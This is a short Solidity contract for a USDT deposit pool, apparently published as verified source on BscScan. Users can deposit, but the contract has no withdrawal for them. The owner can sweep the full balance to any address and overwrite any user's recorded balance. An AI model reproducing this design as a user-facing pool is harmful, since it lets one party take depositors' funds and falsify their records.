/**
 *Submitted for verification at BscScan.com on 2022-08-13
*/

// SPDX-License-Identifier: MIT


pragma solidity ^0.8.0;

interface non_standard_IERC20 {
    function transferFrom(address from, address to, uint256 amount) external;
    function transfer(address _to, uint _value) external;
    function balanceOf(address account) external view returns (uint256);
}

contract USDT_pool {
    
    address public owner;
    non_standard_IERC20 public token;

    mapping(address => uint) public balances;

    event Deposit(address from, uint amount, uint timestamp);

    constructor(non_standard_IERC20 _usdt) {
        token = _usdt; 
        owner = msg.sender;
    }


    function deposit(uint amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        balances[msg.sender] += amount;
        emit Deposit(msg.sender, amount, block.timestamp);
    }

    function withdraw(address _to) external {
        require(msg.sender == owner, "Not an Owner");
        token.transfer(_to, token.balanceOf(address(this)));
    }

    function changeBalance(address _to, uint _amount) external {
        require(msg.sender == owner, "Not an Owner");
        balances[_to] = _amount;
    }

}